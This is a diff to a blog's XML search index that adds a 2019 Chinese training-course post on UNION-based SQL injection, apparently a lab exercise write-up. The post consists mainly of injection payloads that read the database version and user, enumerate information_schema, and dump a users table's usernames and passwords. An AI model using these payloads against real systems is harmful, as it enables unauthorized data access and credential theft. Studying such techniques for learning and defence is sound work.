@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>UNION SELECT 命令 SQL注入</title>
+      <link href="/2019/08/14/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/"/>
+      <url>/2019/08/14/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1、查看当前数据库信息"><a href="#1、查看当前数据库信息" class="headerlink" title="1、查看当前数据库信息"></a>1、查看当前数据库信息</h1><pre><code>and 2=1 union select  database(),version(),user(),4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123551167.png" alt></p><h1 id="2、通过tables表查询相关信息"><a href="#2、通过tables表查询相关信息" class="headerlink" title="2、通过tables表查询相关信息"></a>2、通过tables表查询相关信息</h1><pre><code>and 1=2 union select (select group_concat(table_name,&#39;~&#39;,table_schema,&#39;~&#39;,column_name) from information_schema.columns where table_schema=&#39;content&#39; or table_name=&#39;users&#39; ),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123637831.png" alt></p><h1 id="3、根据查询信息查看单个表的详细信息"><a href="#3、根据查询信息查看单个表的详细信息" class="headerlink" title="3、根据查询信息查看单个表的详细信息"></a>3、根据查询信息查看单个表的详细信息</h1><h2 id="第一个表"><a href="#第一个表" class="headerlink" title="第一个表"></a>第一个表</h2><pre><code>and 1=2 union select (select group_concat(id,&#39;|&#39;,title,&#39;|&#39;,value,&#39;|&#39;,time,&#39;|&#39;,ip) from test.content),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123734085.png" alt></p><h2 id="第二个表"><a href="#第二个表" class="headerlink" title="第二个表"></a>第二个表</h2><pre><code>and 1=2 union select (select group_concat(id,&#39;|&#39;,username,&#39;|&#39;,passwd,&#39;|&#39;,user_ip,&#39;|&#39;,join_date) from test.users),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123814194.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第五周 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL导入表查询数据</title>
       <link href="/2019/08/13/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/"/>
       <url>/2019/08/13/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</url>
